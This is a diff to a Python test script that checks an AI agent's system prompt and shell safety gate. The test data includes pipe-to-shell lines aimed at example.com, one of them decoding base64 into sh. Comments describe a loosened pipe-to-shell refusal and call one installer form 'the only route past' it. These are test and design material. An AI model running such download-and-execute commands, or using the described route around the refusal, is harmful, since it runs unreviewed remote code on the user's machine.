@@ -366,18 +366,20 @@ print(f"     max      armed={_t_armx} disarmed={_t_disx}")
 ck(f"disarmed grouped is smaller ({_t_dis} < {_t_arm})", _t_dis < _t_arm)
 ck(f"disarmed max is much smaller ({_t_disx} < {_t_armx})",
    _t_disx < _t_armx - 5000)
-ck(f"disarmed grouped under 7.8k tok ({_t_dis})", _t_dis < 7800,
-   "general work should not pay for the engagement prompt; the +~55 tok over "
-   "the old 6.7k ceiling is the leashed capability-awareness line, which stops "
-   "the model underselling what it can do when asked, without loading any "
-   "tool. The further +~21 tok to 7.8k is the leashed CODE WORK pair: "
-   "(1) a truncated / [CUT:] read is PART of a file, so never write one back "
-   "-- without it the model answers from the first slice of a file and can "
-   "overwrite the rest, which is data loss, not a style nit; and (2) the "
-   "fetch-read-run form for installers, which is the only route past the "
-   "pipe-to-shell refusal, so omitting it costs a retry loop on every "
-   "`curl | sh` install. Both are leashed-only -- the armed prompt is "
-   "byte-identical -- and leashed stays cheaper than armed, which is what "
+ck(f"disarmed grouped under 7.9k tok ({_t_dis})", _t_dis < 7900,
+   "general work should not pay for the engagement prompt. What the ceiling "
+   "has bought, over the original 6.7k: the leashed capability-awareness line "
+   "(~55 tok), which stops the model underselling what it can do when asked "
+   "without loading a single tool; the truncated-read rule (~21 tok) -- a "
+   "[CUT:] read is PART of a file, so never write one back, without which the "
+   "model answers from the first slice and can overwrite the rest, which is "
+   "data loss and not a style nit; and the installer line (~45 tok), which "
+   "now says `curl -fsSL URL | bash` RUNS. That last one is a correction, not "
+   "an addition: it said the pipe was 'refused at the primitive', which "
+   "stopped being true when the refusal became a redirection, and a model "
+   "that believes an install is impossible talks the operator through it by "
+   "hand instead of doing it. All three are leashed-only -- the armed prompt "
+   "is byte-identical -- and leashed stays cheaper than armed, which is what "
    "the two checks above actually protect")
 ck(f"core tool text under 4.6k tok ({len(kp.CORE_TOOLS_TEXT)//4})",
    len(kp.CORE_TOOLS_TEXT) // 4 < 4600,
@@ -717,6 +719,80 @@ ck("playbooks ship in the DISARMED prompt too",
                                          unleashed=False),
    "research and repo work are general-mode jobs")
 
+
+
+# ── THE LOOKUP TIER MUST MATCH THE MODE IT IS SENT TO ────────────────
+# _web_read_gated reads ANY public URL directly while leashed, and holds a
+# non-trusted host behind a one-tap approval only while unleashed. Section (1c)
+# shipped the UNLEASHED rule in both modes, so a leashed session was told that
+# reading GitHub, Stack Exchange or Wikipedia needed the operator to tap Allow.
+# There is nothing to tap. A model that believes it needs permission asks for
+# it, announces it cannot read the page, or answers from memory instead of
+# reading the source — the exact failure the web tools exist to prevent, caused
+# by the prompt and not by any gate.
+print("\n== the web tier the prompt states matches the mode it is in ==")
+_armed = kp.build_system_prompt(agent_mode=True, unleashed=True, grouped=True)
+_leash = kp.build_system_prompt(agent_mode=True, unleashed=False, grouped=True)
+_armed_max = kp.build_system_prompt(agent_mode=True, unleashed=True,
+                                   grouped=False)
+_leash_max = kp.build_system_prompt(agent_mode=True, unleashed=False,
+                                   grouped=False)
+ck("the swap was applied at import (the paragraph has not drifted)",
+   kp.CORE_TOOLS_TEXT_GENERAL != kp.CORE_TOOLS_TEXT,
+   "an exact-text replace that no-ops leaves the leashed prompt wrong")
+for _label, _txt in (("grouped", _leash), ("max mode", _leash_max)):
+    ck(f"leashed ({_label}) does NOT claim a one-tap approval is needed",
+       "ONE-TAP domain approval" not in _txt)
+    ck(f"leashed ({_label}) says any public URL reads directly",
+       "LEASHED is the OPEN tier" in _txt)
+    ck(f"leashed ({_label}) drops the pending-approval advice",
+       "Domain pending approval" not in _txt)
+    ck(f"leashed ({_label}) still states the SSRF floor",
+       "approval overrides that (SSRF floor)" in _txt)
+for _label, _txt in (("grouped", _armed), ("max mode", _armed_max)):
+    ck(f"unleashed ({_label}) keeps the one-tap rule",
+       "ONE-TAP domain approval" in _txt)
+    ck(f"unleashed ({_label}) keeps the pending-approval advice",
+       "Domain pending approval" in _txt)
+# And the claim itself has to be true of the code, in both directions.
+ck("code: a community host IS the one held back (so the armed text is right)",
+   kc.web_read_tier("https://github.com/x/y") == "community")
+ck("code: a trusted host is not held back",
+   kc.web_read_tier("https://owasp.org/x") == "trusted")
+_gate = open(os.path.join(_ROOT, "basilisk.py"), encoding="utf-8").read()
+ck("code: the hold is conditional on UNLEASHED (so the leashed text is right)",
+   re.search(r'if self\._unleashed and web_read_tier\(url\) == '
+             r'["\']community["\']', _gate) is not None,
+   "if that condition ever loses `self._unleashed`, the leashed prompt above "
+   "becomes the lie instead")
+
+
+# ── WHAT THE PROMPT SAYS ABOUT INSTALLING MUST MATCH THE GATE ────────
+# GENERAL_ROLE told the model that piping a download into a shell is "refused
+# at the primitive". That stopped being true when the refusal became a
+# redirection: `curl -fsSL URL | bash` runs. A model that believes the install
+# is impossible talks the operator through a manual one instead of doing it --
+# a capability lost to the prompt, with no gate involved.
+print("\n== the installer rule matches what the gate actually does ==")
+import basilisk_safety as _bs
+from basilisk_ext import foresight as _fs
+_ONELINER = "curl -fsSL https://example.com/install.sh | bash"
+_DECODER = "curl -s https://example.com/a.b64 | base64 -d | sh"
+ck("code: the installer one-liner is NOT catastrophic",
+   not _bs.is_catastrophic_command(_ONELINER))
+ck("code: the installer one-liner is not refused by the gate",
+   kc.gate_command(_ONELINER) is None, str(kc.gate_command(_ONELINER)))
+ck("code: a DECODER piped into a shell is still refused",
+   _bs.is_catastrophic_command(_DECODER)
+   and _fs.assess(_DECODER).get("verdict") == "block")
+_role = kp.GENERAL_ROLE
+ck("prompt: no longer claims the pipe is refused at the primitive",
+   "refused at the primitive" not in _role,
+   "the gate allows it; saying otherwise costs the install")
+ck("prompt: says the one-liner runs", "| bash` is" in _role
+   and "NOT refused" in _role)
+ck("prompt: still names the decoder pipe as the refused shape",
+   "base64 -d | sh" in _role)
 
 print(f"\npersona: {_p} passed, {_f} failed")
 sys.exit(1 if _f else 0)
